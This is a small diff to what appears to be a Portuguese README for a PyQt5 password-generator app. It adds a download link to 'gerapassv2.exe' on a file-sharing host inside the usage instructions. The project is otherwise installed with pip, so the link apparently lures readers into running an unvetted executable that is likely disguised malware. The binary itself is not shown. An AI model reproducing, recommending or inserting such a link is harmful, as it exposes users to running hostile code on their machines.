@@ -12,6 +12,9 @@
 🔧 Como usar
 📥 Instale os requisitos:
 
+Download:
+https://www.mediafire.com/file/jaeofnmpt6i41fy/gerapassv2.exe/file
+
 pip install PyQt5
 ▶️ Execute o aplicativo:
 
